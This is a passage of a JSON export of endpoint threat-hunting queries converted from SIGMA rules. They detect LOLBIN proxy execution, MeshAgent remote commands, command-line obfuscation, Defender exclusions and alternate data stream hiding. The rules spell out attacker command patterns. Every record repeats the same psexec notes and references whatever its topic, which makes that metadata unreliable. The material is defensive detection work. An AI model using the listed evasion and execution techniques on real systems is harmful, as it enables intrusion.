\"\ud83d\udc9f\" or tgt.process.cmdline contains \"\u262e\ufe0f\" or tgt.process.cmdline contains \"\u271d\ufe0f\" or tgt.process.cmdline contains \"\u262a\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udd49\" or tgt.process.cmdline contains \"\u2638\ufe0f\" or tgt.process.cmdline contains \"\u2721\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udd2f\" or tgt.process.cmdline contains \"\ud83d\udd4e\" or tgt.process.cmdline contains \"\u262f\ufe0f\" or tgt.process.cmdline contains \"\u2626\ufe0f\" or tgt.process.cmdline contains \"\ud83d\uded0\" or tgt.process.cmdline contains \"\u26ce\" or tgt.process.cmdline contains \"\u2648\ufe0f\" or tgt.process.cmdline contains \"\u2649\ufe0f\" or tgt.process.cmdline contains \"\u264a\ufe0f\" or tgt.process.cmdline contains \"\u264b\ufe0f\" or tgt.process.cmdline contains \"\u264c\ufe0f\" or tgt.process.cmdline contains \"\u264d\ufe0f\" or tgt.process.cmdline contains \"\u264e\ufe0f\" or tgt.process.cmdline contains \"\u264f\ufe0f\" or tgt.process.cmdline contains \"\u2650\ufe0f\" or tgt.process.cmdline contains \"\u2651\ufe0f\" or tgt.process.cmdline contains \"\u2652\ufe0f\" or tgt.process.cmdline contains \"\u2653\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udd94\" or tgt.process.cmdline contains \"\u269b\ufe0f\" or tgt.process.cmdline contains \"\ud83c\ude51\" or tgt.process.cmdline contains \"\u2622\ufe0f\" or tgt.process.cmdline contains \"\u2623\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udcf4\" or tgt.process.cmdline contains \"\ud83d\udcf3\" or tgt.process.cmdline contains \"\ud83c\ude36\" or tgt.process.cmdline contains \"\ud83c\ude1a\ufe0f\" or tgt.process.cmdline contains \"\ud83c\ude38\" or tgt.process.cmdline contains \"\ud83c\ude3a\" or tgt.process.cmdline contains \"\ud83c\ude37\ufe0f\" or tgt.process.cmdline contains \"\u2734\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udd9a\" or tgt.process.cmdline contains \"\ud83d\udcae\" or tgt.process.cmdline contains \"\ud83c\ude50\" or tgt.process.cmdline contains \"\u3299\ufe0f\" or tgt.process.cmdline contains \"\u3297\ufe0f\" or tgt.process.cmdline contains \"\ud83c\ude34\" or tgt.process.cmdline contains \"\ud83c\ude35\" or tgt.process.cmdline contains \"\ud83c\ude39\" or tgt.process.cmdline contains \"\ud83c\ude32\" or tgt.process.cmdline contains \"\ud83c\udd70\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udd71\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udd8e\" or tgt.process.cmdline contains \"\ud83c\udd91\" or tgt.process.cmdline contains \"\ud83c\udd7e\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udd98\" or tgt.process.cmdline contains \"\u274c\" or tgt.process.cmdline contains \"\u2b55\ufe0f\" or tgt.process.cmdline contains \"\ud83d\uded1\" or tgt.process.cmdline contains \"\u26d4\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udcdb\" or tgt.process.cmdline contains \"\ud83d\udeab\" or tgt.process.cmdline contains \"\ud83d\udcaf\" or tgt.process.cmdline contains \"\ud83d\udca2\" or tgt.process.cmdline contains \"\u2668\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udeb7\" or tgt.process.cmdline contains \"\ud83d\udeaf\" or tgt.process.cmdline contains \"\ud83d\udeb3\" or tgt.process.cmdline contains \"\ud83d\udeb1\" or tgt.process.cmdline contains \"\ud83d\udd1e\" or tgt.process.cmdline contains \"\ud83d\udcf5\" or tgt.process.cmdline contains \"\ud83d\udead\" or tgt.process.cmdline contains \"\u2757\ufe0f\" or tgt.process.cmdline contains \"\u2755\" or tgt.process.cmdline contains \"\u2753\" or tgt.process.cmdline contains \"\u2754\" or tgt.process.cmdline contains \"\u203c\ufe0f\" or tgt.process.cmdline contains \"\u2049\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udd05\" or tgt.process.cmdline contains \"\ud83d\udd06\" or tgt.process.cmdline contains \"\u303d\ufe0f\" or tgt.process.cmdline contains \"\u26a0\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udeb8\" or tgt.process.cmdline contains \"\ud83d\udd31\" or tgt.process.cmdline contains \"\u269c\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udd30\" or tgt.process.cmdline contains \"\u267b\ufe0f\" or tgt.process.cmdline contains \"\u2705\" or tgt.process.cmdline contains \"\ud83c\ude2f\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udcb9\" or tgt.process.cmdline contains \"\u2747\ufe0f\" or tgt.process.cmdline contains \"\u2733\ufe0f\" or tgt.process.cmdline contains \"\u274e\" or tgt.process.cmdline contains \"\ud83c\udf10\" or tgt.process.cmdline contains \"\ud83d\udca0\" or tgt.process.cmdline contains \"\u24c2\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udf00\" or tgt.process.cmdline contains \"\ud83d\udca4\" or tgt.process.cmdline contains \"\ud83c\udfe7\" or tgt.process.cmdline contains \"\ud83d\udebe\" or tgt.process.cmdline contains \"\u267f\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udd7f\ufe0f\" or tgt.process.cmdline contains \"\ud83d\uded7\" or tgt.process.cmdline contains \"\ud83c\ude33\" or tgt.process.cmdline contains \"\ud83c\ude02\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udec2\" or tgt.process.cmdline contains \"\ud83d\udec3\" or tgt.process.cmdline contains \"\ud83d\udec4\" or tgt.process.cmdline contains \"\ud83d\udec5\" or tgt.process.cmdline contains \"\ud83d\udeb9\" or tgt.process.cmdline contains \"\ud83d\udeba\" or tgt.process.cmdline contains \"\ud83d\udebc\" or tgt.process.cmdline contains \"\u26a7\" or tgt.process.cmdline contains \"\ud83d\udebb\" or tgt.process.cmdline contains \"\ud83d\udeae\" or tgt.process.cmdline contains \"\ud83c\udfa6\" or tgt.process.cmdline contains \"\ud83d\udcf6\" or tgt.process.cmdline contains \"\ud83c\ude01\" or tgt.process.cmdline contains \"\ud83d\udd23\" or tgt.process.cmdline contains \"\u2139\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udd24\" or tgt.process.cmdline contains \"\ud83d\udd21\" or tgt.process.cmdline contains \"\ud83d\udd20\" or tgt.process.cmdline contains \"\ud83c\udd96\" or tgt.process.cmdline contains \"\ud83c\udd97\" or tgt.process.cmdline contains \"\ud83c\udd99\" or tgt.process.cmdline contains \"\ud83c\udd92\" or tgt.process.cmdline contains \"\ud83c\udd95\" or tgt.process.cmdline contains \"\ud83c\udd93\" or tgt.process.cmdline contains \"0\ufe0f\u20e3\" or tgt.process.cmdline contains \"1\ufe0f\u20e3\" or tgt.process.cmdline contains \"2\ufe0f\u20e3\" or tgt.process.cmdline contains \"3\ufe0f\u20e3\" or tgt.process.cmdline contains \"4\ufe0f\u20e3\" or tgt.process.cmdline contains \"5\ufe0f\u20e3\" or tgt.process.cmdline contains \"6\ufe0f\u20e3\" or tgt.process.cmdline contains \"7\ufe0f\u20e3\" or tgt.process.cmdline contains \"8\ufe0f\u20e3\" or tgt.process.cmdline contains \"9\ufe0f\u20e3\" or tgt.process.cmdline contains \"\ud83d\udd1f\" or tgt.process.cmdline contains \"\ud83d\udd22\" or tgt.process.cmdline contains \"#\ufe0f\u20e3\" or tgt.process.cmdline contains \"\ufe0f\u20e3\" or tgt.process.cmdline contains \"\u23cf\ufe0f\" or tgt.process.cmdline contains \"\u25b6\ufe0f\" or tgt.process.cmdline contains \"\u23f8\" or tgt.process.cmdline contains \"\u23ef\" or tgt.process.cmdline contains \"\u23f9\" or tgt.process.cmdline contains \"\u23fa\" or tgt.process.cmdline contains \"\u23ed\" or tgt.process.cmdline contains \"\u23ee\" or tgt.process.cmdline contains \"\u23e9\" or tgt.process.cmdline contains \"\u23ea\" or tgt.process.cmdline contains \"\u23eb\" or tgt.process.cmdline contains \"\u23ec\" or tgt.process.cmdline contains \"\u25c0\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udd3c\" or tgt.process.cmdline contains \"\ud83d\udd3d\" or tgt.process.cmdline contains \"\u27a1\ufe0f\" or tgt.process.cmdline contains \"\u2b05\ufe0f\" or tgt.process.cmdline contains \"\u2b06\ufe0f\" or tgt.process.cmdline contains \"\u2b07\ufe0f\" or tgt.process.cmdline contains \"\u2197\ufe0f\" or tgt.process.cmdline contains \"\u2198\ufe0f\" or tgt.process.cmdline contains \"\u2199\ufe0f\" or tgt.process.cmdline contains \"\u2196\ufe0f\" or tgt.process.cmdline contains \"\u2195\ufe0f\" or tgt.process.cmdline contains \"\u2194\ufe0f\" or tgt.process.cmdline contains \"\u21aa\ufe0f\" or tgt.process.cmdline contains \"\u21a9\ufe0f\" or tgt.process.cmdline contains \"\u2934\ufe0f\" or tgt.process.cmdline contains \"\u2935\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udd00\" or tgt.process.cmdline contains \"\ud83d\udd01\" or tgt.process.cmdline contains \"\ud83d\udd02\" or tgt.process.cmdline contains \"\ud83d\udd04\" or tgt.process.cmdline contains \"\ud83d\udd03\" or tgt.process.cmdline contains \"\ud83c\udfb5\" or tgt.process.cmdline contains \"\ud83c\udfb6\" or tgt.process.cmdline contains \"\u2795\" or tgt.process.cmdline contains \"\u2796\" or tgt.process.cmdline contains \"\u2797\" or tgt.process.cmdline contains \"\u2716\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udff0\" or tgt.process.cmdline contains \"\u267e\" or tgt.process.cmdline contains \"\ud83d\udcb2\" or tgt.process.cmdline contains \"\ud83d\udcb1\" or tgt.process.cmdline contains \"\u2122\ufe0f\" or tgt.process.cmdline contains \"\u00a9\ufe0f\" or tgt.process.cmdline contains \"\u00ae\ufe0f\" or tgt.process.cmdline contains \"\u3030\ufe0f\" or tgt.process.cmdline contains \"\u27b0\" or tgt.process.cmdline contains \"\u27bf\" or tgt.process.cmdline contains \"\ud83d\udd1a\" or tgt.process.cmdline contains \"\ud83d\udd19\" or tgt.process.cmdline contains \"\ud83d\udd1b\" or tgt.process.cmdline contains \"\ud83d\udd1d\" or tgt.process.cmdline contains \"\ud83d\udd1c\" or tgt.process.cmdline contains \"\u2714\ufe0f\" or tgt.process.cmdline contains \"\u2611\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udd18\" or tgt.process.cmdline contains \"\ud83d\udd34\" or tgt.process.cmdline contains \"\ud83d\udfe0\" or tgt.process.cmdline contains \"\ud83d\udfe1\" or tgt.process.cmdline contains \"\ud83d\udfe2\" or tgt.process.cmdline contains \"\ud83d\udd35\" or tgt.process.cmdline contains \"\ud83d\udfe3\" or tgt.process.cmdline contains \"\u26ab\ufe0f\" or tgt.process.cmdline contains \"\u26aa\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udfe4\" or tgt.process.cmdline contains \"\ud83d\udd3a\" or tgt.process.cmdline contains \"\ud83d\udd3b\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 323
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects suspicious child processes of \"provlaunch.exe\" which might indicate potential abuse to proxy execution.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1218"
            ],
            "name": "Suspicious Provlaunch.EXE Child Process",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (src.process.image.path contains \"\\provlaunch.exe\" and ((tgt.process.image.path contains \"\\calc.exe\" or tgt.process.image.path contains \"\\cmd.exe\" or tgt.process.image.path contains \"\\cscript.exe\" or tgt.process.image.path contains \"\\mshta.exe\" or tgt.process.image.path contains \"\\notepad.exe\" or tgt.process.image.path contains \"\\powershell.exe\" or tgt.process.image.path contains \"\\pwsh.exe\" or tgt.process.image.path contains \"\\regsvr32.exe\" or tgt.process.image.path contains \"\\rundll32.exe\" or tgt.process.image.path contains \"\\wscript.exe\") or (tgt.process.image.path contains \":\\PerfLogs\\\" or tgt.process.image.path contains \":\\Temp\\\" or tgt.process.image.path contains \":\\Users\\Public\\\" or tgt.process.image.path contains \"\\AppData\\Temp\\\" or tgt.process.image.path contains \"\\Windows\\System32\\Tasks\\\" or tgt.process.image.path contains \"\\Windows\\Tasks\\\" or tgt.process.image.path contains \"\\Windows\\Temp\\\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 324
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the use of MeshAgent to execute commands on the target host, particularly when threat actors might abuse it to execute commands directly.\nMeshAgent can execute commands on the target host by leveraging win-console to obscure their activities and win-dispatcher to run malicious code through IPC with child processes.\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1219"
            ],
            "name": "Remote Access Tool - MeshAgent Command Execution via MeshCentral",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (src.process.image.path contains \"\\meshagent.exe\" and (tgt.process.image.path contains \"\\cmd.exe\" or tgt.process.image.path contains \"\\powershell.exe\" or tgt.process.image.path contains \"\\pwsh.exe\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 325
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Extract data from cab file and hide it in an alternate data stream",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1564"
            ],
            "name": "Suspicious Extrac32 Alternate Data Stream Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.cmdline contains \"extrac32.exe\" and tgt.process.cmdline contains \".cab\") and tgt.process.cmdline matches \":[^\\\\\\\\]\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 326
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects uncommon child process of Setres.EXE.\nSetres.EXE is a Windows server only process and tool that can be used to set the screen resolution.\nIt can potentially be abused in order to launch any arbitrary file with a name containing the word \"choice\" from the current execution path.\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1218",
                "t1202"
            ],
            "name": "Uncommon Child Process Of Setres.EXE",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((src.process.image.path contains \"\\setres.exe\" and tgt.process.image.path contains \"\\choice\") and (not (tgt.process.image.path contains \"C:\\Windows\\System32\\choice.exe\" or tgt.process.image.path contains \"C:\\Windows\\SysWOW64\\choice.exe\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 327
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the use of the Microsoft signed script \"CL_mutexverifiers\" to proxy the execution of additional PowerShell script commands",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1216"
            ],
            "name": "Potential Script Proxy Execution Via CL_Mutexverifiers.ps1",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (((src.process.image.path contains \"\\powershell.exe\" or src.process.image.path contains \"\\pwsh.exe\") and tgt.process.image.path contains \"\\powershell.exe\" and tgt.process.cmdline contains \" -nologo -windowstyle minimized -file \") and (tgt.process.cmdline contains \"\\AppData\\Local\\Temp\\\" or tgt.process.cmdline contains \"\\Windows\\Temp\\\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 328
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects potential abuse of the provisioning registry key for indirect command execution through \"Provlaunch.exe\".",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1218"
            ],
            "name": "Potential Provisioning Registry Key Abuse For Binary Proxy Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and tgt.process.cmdline contains \"SOFTWARE\\Microsoft\\Provisioning\\Commands\\\")",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 329
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the use of the Dinject PowerShell cradle based on the specific flags",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1055"
            ],
            "name": "HackTool - DInjector PowerShell Cradle Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \" /am51\" and tgt.process.cmdline contains \" /password\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 330
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects possible payload obfuscation via the commandline",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1059"
            ],
            "name": "Potential Dosfuscation Activity",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"^^\" or tgt.process.cmdline contains \"^|^\" or tgt.process.cmdline contains \",;,\" or tgt.process.cmdline contains \";;;;\" or tgt.process.cmdline contains \";; ;;\" or tgt.process.cmdline contains \"(,(,\" or tgt.process.cmdline contains \"%COMSPEC:~\" or tgt.process.cmdline contains \" c^m^d\" or tgt.process.cmdline contains \"^c^m^d\" or tgt.process.cmdline contains \" c^md\" or tgt.process.cmdline contains \" cm^d\" or tgt.process.cmdline contains \"^cm^d\" or tgt.process.cmdline contains \" s^et \" or tgt.process.cmdline contains \" s^e^t \" or tgt.process.cmdline contains \" se^t \"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 331
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects usage of Gpg4win to encrypt/decrypt files located in potentially suspicious locations.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [],
            "name": "File Encryption/Decryption Via Gpg4win From Suspicious Locations",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (((tgt.process.image.path contains \"\\gpg.exe\" or tgt.process.image.path contains \"\\gpg2.exe\") or tgt.process.displayName=\"GNU Privacy Guard (GnuPG)\" or tgt.process.displayName=\"GnuPG\u2019s OpenPGP tool\") and tgt.process.cmdline contains \"-passphrase\" and (tgt.process.cmdline contains \":\\PerfLogs\\\" or tgt.process.cmdline contains \":\\Temp\\\" or tgt.process.cmdline contains \":\\Users\\Public\\\" or tgt.process.cmdline contains \":\\Windows\\Temp\\\" or tgt.process.cmdline contains \"\\AppData\\Local\\Temp\\\" or tgt.process.cmdline contains \"\\AppData\\Roaming\\\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 332
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects requests to exclude files, folders or processes from Antivirus scanning using PowerShell cmdlets",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1562"
            ],
            "name": "Powershell Defender Exclusion",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.cmdline contains \"Add-MpPreference \" or tgt.process.cmdline contains \"Set-MpPreference \") and (tgt.process.cmdline contains \" -ExclusionPath \" or tgt.process.cmdline contains \" -ExclusionExtension \" or tgt.process.cmdline contains \" -ExclusionProcess \" or tgt.process.cmdline contains \" -ExclusionIpAddress \")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 333
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the execution of a signed binary dropped by Kaspersky Lab Products Remover (kavremover) which can be abused as a LOLBIN to execute arbitrary commands and binaries.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1127"
            ],
            "name": "Kavremover Dropped Binary LOLBIN Usage",
